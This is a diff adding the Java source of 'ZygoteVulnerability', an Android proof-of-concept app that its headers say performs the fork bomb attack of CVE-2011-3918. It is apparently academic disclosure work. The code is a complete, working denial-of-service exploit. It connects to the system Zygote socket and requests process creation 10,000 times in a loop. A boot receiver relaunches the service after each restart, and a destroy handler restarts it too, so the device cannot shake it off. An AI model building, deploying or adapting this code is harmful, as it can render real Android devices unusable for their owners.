@@ -1,0 +1,511 @@
+################# BootReceiver.java ##################
+
+/**
+ * Android Application that performs the fork bomb attack http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2011-3918
+ *
+ * Further informations can be found at http://www.ai-lab.it/bugAndroid/bugAndroid.html
+ * 
+ * 
+ * @author Luca Verderame <luca.verderame@unige.it>
+ * @version 1.0
+ * 
+ * Copyright 2012 Luca Verderame
+ * 
+ * This file is part of ZygoteVulnerability.
+
+    ZygoteVulnerability is free software: you can redistribute it and/or modify
+    it under the terms of the GNU General Public License as published by
+    the Free Software Foundation, either version 3 of the License, or
+    (at your option) any later version.
+
+    ZygoteVulnerability is distributed in the hope that it will be useful,
+    but WITHOUT ANY WARRANTY; without even the implied warranty of
+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+    GNU General Public License for more details.
+
+    You should have received a copy of the GNU General Public License
+    along with ZygoteVulnerability.  If not, see <http://www.gnu.org/licenses/>.
+ * 
+ */
+
+
+
+package it.ailab;
+
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.util.Log;
+ 
+public class BootReceiver extends BroadcastReceiver{
+	
+        @Override
+        public void onReceive(Context context, Intent intent) {
+        	
+	        	Log.d("BOOT","boot completed. starting service");
+	        	Intent intentReceiver = new Intent();
+	        	intentReceiver.setAction("it.ailab.ServiceDOS");
+	            context.startService(intentReceiver);
+        }
+}
+
+
+################# ServiceDOS.java ##################
+
+
+/**
+ * Android Application that performs the fork bomb attack http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2011-3918
+ *
+ * Further informations can be found at http://www.ai-lab.it/bugAndroid/bugAndroid.html
+ * 
+ * 
+ * @author Luca Verderame <luca.verderame@unige.it>
+ * @version 1.0
+ * 
+ * Copyright 2012 Luca Verderame
+ * 
+ * This file is part of ZygoteVulnerability.
+
+    ZygoteVulnerability is free software: you can redistribute it and/or modify
+    it under the terms of the GNU General Public License as published by
+    the Free Software Foundation, either version 3 of the License, or
+    (at your option) any later version.
+
+    ZygoteVulnerability is distributed in the hope that it will be useful,
+    but WITHOUT ANY WARRANTY; without even the implied warranty of
+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+    GNU General Public License for more details.
+
+    You should have received a copy of the GNU General Public License
+    along with ZygoteVulnerability.  If not, see <http://www.gnu.org/licenses/>.
+ * 
+ */
+
+
+package it.ailab;
+
+
+import java.io.BufferedWriter;
+import java.io.DataInputStream;
+import java.io.IOException;
+import java.io.PrintWriter;
+
+import android.app.Service;
+import android.content.Intent;
+import android.net.LocalSocket;
+import android.net.LocalSocketAddress;
+import android.os.HandlerThread;
+import android.os.IBinder;
+import android.util.Log;
+
+public class ServiceDOS extends Service{
+	
+	SocketUtil socketUtil = null;
+	
+	public boolean connectToZygoteIfNeeded(){
+		
+		int retry = 0;
+		while(((socketUtil == null) || (socketUtil.sZygoteSocket == null)) && retry < 20)
+		{
+			Log.d("SERV", "connection to socket needed");
+			socketUtil = null;
+			if (retry > 0) {
+                try {
+                   Log.d("SERV", "Zygote not up yet, sleeping...");
+                   Thread.sleep(500);
+                } catch (InterruptedException ex) {
+                   // should never happen
+                }
+			}
+			//loading part..
+		    	    
+		    LocalSocket client = new LocalSocket();
+
+            try {
+				client.connect(new LocalSocketAddress("zygote",LocalSocketAddress.Namespace.RESERVED));
+			} catch (IOException e1) {
+				// TODO Auto-generated catch block
+				Log.e("SERV","link client error");
+				e1.printStackTrace();
+			}
+            
+			if(client != null)
+			{
+				DataInputStream in = null;
+				try {
+					in = new DataInputStream(client.getInputStream());
+				} catch (IOException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}
+				PrintWriter p = null;
+				try {
+					p = new PrintWriter(client.getOutputStream());
+				} catch (IOException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}
+				BufferedWriter out = new BufferedWriter(p);
+				socketUtil = new SocketUtil(client,in,out);
+				Log.d("SERV", "socket connection completed");
+			}
+			retry++;
+		} //fine while
+		if(socketUtil != null)
+		{
+			if(retry > 0)
+				Log.d("SERV", "socket connection completed");
+			return true;
+		}
+		return false;
+	}
+	
+	
+	
+	@Override
+	  public void onCreate() {
+	    // Start up the thread running the service.  Note that we create a
+	    // separate thread because the service normally runs in the process's
+	    // main thread, which we don't want to block.  We also make it
+	    // background priority so CPU-intensive work will not disrupt our UI.
+	    HandlerThread thread = new HandlerThread("ServiceDOS");
+	    thread.start();	    
+	    connectToZygoteIfNeeded();	
+	  }
+	
+	@Override
+	public IBinder onBind(Intent intent) {
+		// TODO Auto-generated method stub
+		onStartCommand(intent,0,0);
+		return null;
+	}
+	
+	@Override
+	  public int onStartCommand(Intent intent, int flags, int startId) {
+	    
+		Log.d("SERV","onStart");
+		final int uid = 123456;
+		final int gid = 123456;
+		final int[] gids = {};
+		String[] extraArgs = null; //altrimenti null
+
+		String className = "com.android.internal.util.WithFramework";
+		//String className = "android.app.ActivityThread";
+		
+		int res = 0;
+		int tr = 0;
+		while(tr<10000)
+		{
+			//String niceName = "DummyProcess" + tr;
+			
+			connectToZygoteIfNeeded(); 
+			try {
+				res = socketUtil.startViaZygote(className,null,uid,gid,gids,0,extraArgs);
+			} catch (Exception e) {
+				// TODO Auto-generated catch block
+				Log.e("SERV", "starting error");
+				e.printStackTrace();
+			}
+			//Log.d("SERV", "risultato startViaZygote: " + res);
+			Log.d("SERV", "started process #:" +tr);
+			tr++;
+		}//fine while
+		
+		//if whe return here -> restart!
+		return START_STICKY;
+	  }
+	
+	@Override
+	public void onDestroy (){
+		socketUtil.clean();
+		socketUtil = null;
+		Log.d("SERV", "service destroyed! trying to restart...");
+		Intent intent = new Intent(this, ServiceDOS.class);
+		onStartCommand(intent,0,0);
+	}
+
+}
+
+
+################# SocketAndroidActivity.java ##################
+
+/**
+ * Android Application that performs the fork bomb attack http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2011-3918
+ *
+ * Further informations can be found at http://www.ai-lab.it/bugAndroid/bugAndroid.html
+ * 
+ * 
+ * @author Luca Verderame <luca.verderame@unige.it>
+ * @version 1.0
+ * 
+ * Copyright 2012 Luca Verderame
+ * 
+ * This file is part of ZygoteVulnerability.
+
+    ZygoteVulnerability is free software: you can redistribute it and/or modify
+    it under the terms of the GNU General Public License as published by
+    the Free Software Foundation, either version 3 of the License, or
+    (at your option) any later version.
+
+    ZygoteVulnerability is distributed in the hope that it will be useful,
+    but WITHOUT ANY WARRANTY; without even the implied warranty of
+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+    GNU General Public License for more details.
+
+    You should have received a copy of the GNU General Public License
+    along with ZygoteVulnerability.  If not, see <http://www.gnu.org/licenses/>.
+ * 
+ */
+
+
+package it.ailab;
+
+
+import android.app.Activity;
+import android.content.Intent;
+import android.os.Bundle;
+import android.util.Log;
+
+public class SocketAndroidActivity extends Activity {
+    /** Called when the activity is first created. */
+    @Override
+    public void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+
+        Log.d("APP","starting of the service");
+        Intent intent = new Intent(this, ServiceDOS.class);
+        startService(intent);
+        Log.d("APP","service activated");
+        this.finish();
+		
+    }
+}
+
+
+################# SocketUtil.java ##################
+
+
+/**
+ * Android Application that performs the fork bomb attack http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2011-3918
+ *
+ * Further informations can be found at http://www.ai-lab.it/bugAndroid/bugAndroid.html
+ * 
+ * 
+ * @author Luca Verderame <luca.verderame@unige.it>
+ * @version 1.0
+ * 
+ * Copyright 2012 Luca Verderame
+ * 
+ * This file is part of ZygoteVulnerability.
+
+    ZygoteVulnerability is free software: you can redistribute it and/or modify
+    it under the terms of the GNU General Public License as published by
+    the Free Software Foundation, either version 3 of the License, or
+    (at your option) any later version.
+
+    ZygoteVulnerability is distributed in the hope that it will be useful,
+    but WITHOUT ANY WARRANTY; without even the implied warranty of
+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+    GNU General Public License for more details.
+
+    You should have received a copy of the GNU General Public License
+    along with ZygoteVulnerability.  If not, see <http://www.gnu.org/licenses/>.
+ * 
+ */
+
+package it.ailab;
+
+import java.io.BufferedWriter;
+import java.io.DataInputStream;
+import java.io.IOException;
+import java.util.ArrayList;
+
+import android.net.LocalSocket;
+
+public class SocketUtil {
+	
+	static LocalSocket sZygoteSocket = null;
+	static DataInputStream sZygoteInputStream = null;
+	static BufferedWriter sZygoteWriter = null;
+	
+	/* versione unixDomainSocket
+	static UnixDomainSocketClient sZygoteSocket = null;
+	public SocketUtil(UnixDomainSocketClient c, DataInputStream i,BufferedWriter o)
+	{
+		sZygoteSocket = c;
+		sZygoteInputStream = i;
+		sZygoteWriter = o;
+	}
+	*/
+	
+	public void clean()
+	{
+		try {
+			sZygoteSocket.close();
+			sZygoteInputStream.close();
+			sZygoteWriter.close();
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+		sZygoteSocket = null;
+		sZygoteWriter = null;
+		sZygoteInputStream = null;
+	}
+	
+	public SocketUtil(LocalSocket c, DataInputStream i,BufferedWriter o)
+	{
+		sZygoteSocket = c;
+		sZygoteInputStream = i;
+		sZygoteWriter = o;
+	}
+	
+	/*
+	 * Starts a new process via the zygote mechanism.
+	Parameters:
+	processClass Class name whose static main() to run
+	niceName 'nice' process name to appear in ps
+	uid a POSIX uid that the new process should setuid() to
+	gid a POSIX gid that the new process shuold setgid() to
+	gids null-ok; a list of supplementary group IDs that the new process should setgroup() to.
+	enableDebugger True if debugging should be enabled for this process.
+	extraArgs Additional arguments to supply to the zygote process.
+	Returns:
+	PID
+	Throws:
+	Exception if process start failed for any reason
+	 */
+	
+	public int startViaZygote(final String processClass,
+			                                  final String niceName,
+			                                  final int uid, final int gid,
+			                                  final int[] gids,
+			                                  int debugFlags,
+			                                  String[] extraArgs)
+			                                  throws Exception {
+			        int pid;
+			
+			        synchronized(Process.class) {
+			            ArrayList<String> argsForZygote = new ArrayList<String>();
+			
+			            // --runtime-init, --setuid=, --setgid=,
+			            // and --setgroups= must go first
+			            argsForZygote.add("--runtime-init");
+			           // argsForZygote.add("--setuid=" + uid);
+			            //argsForZygote.add("--setgid=" + gid);
+			            //argsForZygote.add("--classpath=:data:data:socketAndroid");
+			            //argsForZygote.add("data.data.android.socket.a.socket.DummyClass");
+			            
+			            //opzioni da sistemare eventualmente dopo & Zygote.DEBUG_ENABLE_SAFEMODE, & Zygote.DEBUG_ENABLE_DEBUGGER
+			            //& Zygote.DEBUG_ENABLE_CHECKJNI & Zygote.DEBUG_ENABLE_ASSERT
+			            if ((debugFlags ) != 0) {
+			                argsForZygote.add("--enable-safemode");
+			            }
+			            if ((debugFlags ) != 0) {
+			                argsForZygote.add("--enable-debugger");
+			            }
+			            if ((debugFlags ) != 0) {
+			                argsForZygote.add("--enable-checkjni");
+			            }
+			            if ((debugFlags ) != 0) {
+			                argsForZygote.add("--enable-assert");
+			            }
+						
+			            //TODO optionally enable debuger
+			            //argsForZygote.add("--enable-debugger");
+			
+			           /*
+			            // --setgroups is a comma-separated list
+			           if (gids != null && gids.length > 0) {
+			                StringBuilder sb = new StringBuilder();
+			                sb.append("--setgroups=");
+			
+			                int sz = gids.length;
+			                for (int i = 0; i < sz; i++) {
+			                    if (i != 0) {
+			                        sb.append(',');
+			                    }
+			                    sb.append(gids[i]);
+			                }
+			
+		                	argsForZygote.add(sb.toString());
+			            }
+						*/
+			            if (niceName != null) {
+			                argsForZygote.add("--nice-name=" + niceName);
+			            }
+			
+			            argsForZygote.add(processClass);
+			
+			            if (extraArgs != null) {
+			                for (String arg : extraArgs) {
+			                    argsForZygote.add(arg);
+			                }
+			            }
+			            
+			            pid = zygoteSendArgsAndGetPid(argsForZygote);
+			        }
+			
+			        if (pid <= 0) {
+			            throw new Exception("zygote start failed:" + pid);
+			        }
+			
+			       return pid;
+	}
+	
+	    private static int zygoteSendArgsAndGetPid(ArrayList<String> args)
+	            throws Exception {
+	
+	        int pid = 0;
+	
+	        //openZygoteSocketIfNeeded();
+	
+	        try {
+	            
+	/*See com.android.internal.os.ZygoteInit.readArgumentList() 
+		Presently the wire format to the zygote process is: 
+		a) a count of arguments (argc, in essence) 
+		b) a number of newline-separated argument strings equal to count After the zygote process reads 
+			these it will write the pid of the child or -1 on failure.
+	*/
+	            sZygoteWriter.write(Integer.toString(args.size()));
+	            sZygoteWriter.newLine();
+	
+	            int sz = args.size();
+	            for (int i = 0; i < sz; i++) {
+	                String arg = args.get(i);
+	                if (arg.indexOf('\n') >= 0) {
+	                    throw new Exception(
+	                            "embedded newlines not allowed");
+	                }
+	                sZygoteWriter.write(arg);
+	                sZygoteWriter.newLine();
+	            }
+	
+	            sZygoteWriter.flush();
+	
+	            // Should there be a timeout on this?
+	            pid = sZygoteInputStream.readInt();
+	
+	            if (pid < 0) {
+	                throw new Exception("fork() failed");
+	            }
+	        } catch (IOException ex) {
+	                if (sZygoteSocket != null) {
+	                    sZygoteSocket.close();
+	            /*
+	            } catch (IOException ex2) {
+	                // we're going to fail anyway
+	                Log.e("app","I/O exception on routine close", ex2);
+	            }
+				*/
+	            sZygoteSocket = null;
+	
+	            throw new Exception(ex);
+	            }
+	        }
+	
+	        return pid;
+	    }
+
+}
